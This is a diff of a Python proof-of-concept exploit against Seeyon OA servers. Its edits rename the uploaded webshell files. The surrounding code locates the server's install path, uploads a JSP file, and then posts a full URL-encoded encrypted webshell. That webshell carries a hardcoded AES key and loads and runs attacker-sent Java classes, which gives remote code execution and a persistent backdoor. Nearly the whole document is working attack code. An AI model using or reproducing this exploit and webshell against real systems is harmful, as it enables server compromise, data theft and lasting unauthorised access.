@@ -26,7 +26,7 @@ def POC_1(target_url):
             OA_dir = re.findall(r'>(.*)\\UFseeyon\\', response.text)[0]
             OA_dir = OA_dir[:2] + '/' + OA_dir[3:]
             print("\033[32m[o] 目标 {}存在漏洞, 安装路径为:{} \033[0m".format(target_url, OA_dir))
-            webshell_name = "test_upload{}.jsp".format(random.randint(1,999))
+            webshell_name = "peiqi_upload{}.jsp".format(random.randint(1,999))
             OA_dir = OA_dir + "/UFseeyon/OA/tomcat/webapps/yyoa/{}".format(webshell_name)
             POC_2(target_url, OA_dir, webshell_name)
         else:
@@ -50,7 +50,7 @@ def POC_2(target_url, OA_dir, webshell_name):
         print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url), e)
 
 def POC_3(target_url, webshell_name):
-    rebe_webshell = "test_webshell{}.jsp".format(random.randint(1,999))
+    rebe_webshell = "peiqiwebshell{}.jsp".format(random.randint(1,999))
     vuln_url = target_url + "/yyoa/{}?f={}".format(webshell_name, rebe_webshell)
     data = "t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E"
     headers = {
